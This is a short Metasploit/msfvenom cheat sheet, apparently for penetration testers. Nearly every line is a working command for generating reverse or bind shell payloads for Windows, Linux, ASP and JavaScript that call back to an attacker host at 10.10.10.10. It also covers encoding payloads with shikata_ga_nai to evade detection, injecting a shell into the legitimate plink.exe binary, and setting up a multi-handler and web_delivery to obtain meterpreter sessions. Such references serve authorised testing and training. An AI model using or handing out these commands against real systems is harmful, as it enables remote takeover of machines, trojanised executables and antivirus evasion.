# List 
msfvenom -l payloads
msfvenom -l formats
msfvenom -l encoders

# Create an staged Windows binary payload
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe

# Create an staged Linux binary payload
msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o reverse_shell.elf

# Create an staged Framework payload
msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp -o reverse_shell.asp
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f js_le

# Create an staged payload excluding bad characters (useful for exploits)
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f c -a x86 -b "\x00\x0a\x0d"

# Create a non staged Windows binary payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe

# Create an staged Windows binary ENCODED payload
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o reverse_shell_encoded.exe

# INJECT an encoded payload to an executable
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -x /usr/share/windows-binaries/plink.exe -o
reverse_shell_encoded_embedded.exe

# Create an encoded python payload excluding BAD CHARS
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -i 3 -f py

# Create a payload specifying the VARIABLE name
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f py -v shellcode

# Create a payload adding 10 NOPs at the beginning
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f py -n 10

# Multi handler
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit -j -z

# Get meterpreter
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set target 2
set LHOST eth0
run



